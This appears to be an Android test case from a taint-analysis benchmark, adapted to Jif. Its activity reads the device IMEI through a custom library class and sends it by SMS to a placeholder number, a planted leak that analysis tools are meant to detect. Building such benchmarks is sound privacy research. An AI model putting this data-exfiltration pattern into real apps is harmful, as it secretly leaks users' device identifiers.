package test;

import test.Activity;
import android.os.Bundle;
import test.SmsManager;
import android.view.Menu;
import test.R;
import jif.runtime.Runtime;

/**
 * @testcase_name Library2
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description The IMEI is read out inside a custom library and then leaked in the app.
 * @dataflow OnCreate: source -> imei -> sink
 * @number_of_leaks 1
 * @challenges The analysis must correctly handle custom libraries
 */
public class MainActivity extends Activity {

    @Override
    protected void onCreate{}(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout);
        LibClass lc = new LibClass();
        String imei = lc.getIMEI(this);
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49", null, imei, null, null);
    }

    @Override
    public boolean onCreateOptionsMenu{}(Menu menu) {
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }
}
